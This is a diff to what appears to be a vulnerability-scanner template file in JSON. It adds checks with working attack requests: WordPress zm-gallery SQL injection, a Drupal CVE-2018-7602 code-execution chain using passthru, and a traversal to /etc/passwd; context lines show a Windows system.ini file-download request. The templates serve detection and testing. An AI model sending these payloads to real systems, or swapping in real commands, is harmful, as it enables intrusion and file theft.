@@ -67,7 +67,7 @@
     {
       "id": "CVE-2005-2428",
       "info": {
-        "name": "CVE-2005-2428",
+        "name": "Lotus Domino R5 and R6 WebMail Default Configuration Information Disclosure",
         "severity": "medium"
       },
       "requests": [
@@ -4443,6 +4443,22 @@
       ]
     },
     {
+      "id": "CVE-2016-10940",
+      "info": {
+        "name": "The zm-gallery plugin 1.0 for WordPress SQLI",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
+            "GET /wp-admin/admin.php?page=zm_gallery&orderby=(SELECT%20(CASE%20WHEN%20(7422=7422)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))&order=desc HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /wp-admin/admin.php?page=zm_gallery&orderby=(SELECT%20(CASE%20WHEN%20(7422=7421)%20THEN%200x6e616d65%20ELSE%20(SELECT%203211%20UNION%20SELECT%208682)%20END))&order=desc HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2016-10956",
       "info": {
         "name": "Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)",
@@ -7007,6 +7023,23 @@
       ]
     },
     {
+      "id": "CVE-2018-7602",
+      "info": {
+        "name": "Drupal Remote Code Execution Vulnerability",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /?q=user%2Flogin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nform_id=user_login&name={{username}}&pass={{password}}&op=Log+in\n",
+            "GET /?q={{url_encode(\"{{userid}}\")}}%2Fcancel HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /?q={{url_encode(\"{{userid}}\")}}%2Fcancel&destination={{url_encode(\"{{userid}}\")}}%2Fcancel%3Fq%5B%2523post_render%5D%5B%5D%3Dpassthru%26q%5B%2523type%5D%3Dmarkup%26q%5B%2523markup%5D%3Decho+COP-2067-8102-EVC+|+rev HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nform_id=user_cancel_confirm_form&form_token={{form_token}}&_triggering_element_name=form_id&op=Cancel+account\n",
+            "POST /?q=file%2Fajax%2Factions%2Fcancel%2F%23options%2Fpath%2F{{form_build_id}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nform_build_id={{form_build_id}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-7700",
       "info": {
         "name": "DedeCMS V5.7SP2 RCE",
@@ -7538,7 +7571,7 @@
     {
       "id": "CVE-2019-13462",
       "info": {
-        "name": "Lansweeper through 7.1.115.4 unauthenticated SQL injection",
+        "name": "Lansweeper Unauthenticated SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -9179,6 +9212,21 @@
       ]
     },
     {
+      "id": "CVE-2020-12447",
+      "info": {
+        "name": "Onkyo TX-NR585 Web Interface - Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-12720",
       "info": {
         "name": "CVE-2020-12720 vBulletin SQLI",
@@ -10289,9 +10337,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "content-type": "text/xml",
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
@@ -12899,7 +12947,7 @@
     {
       "id": "CVE-2021-26855",
       "info": {
-        "name": "Exchange Server SSRF Vulnerability",
+        "name": "Microsoft Exchange Server SSRF Vulnerability",
         "severity": "critical"
       },
       "requests": [
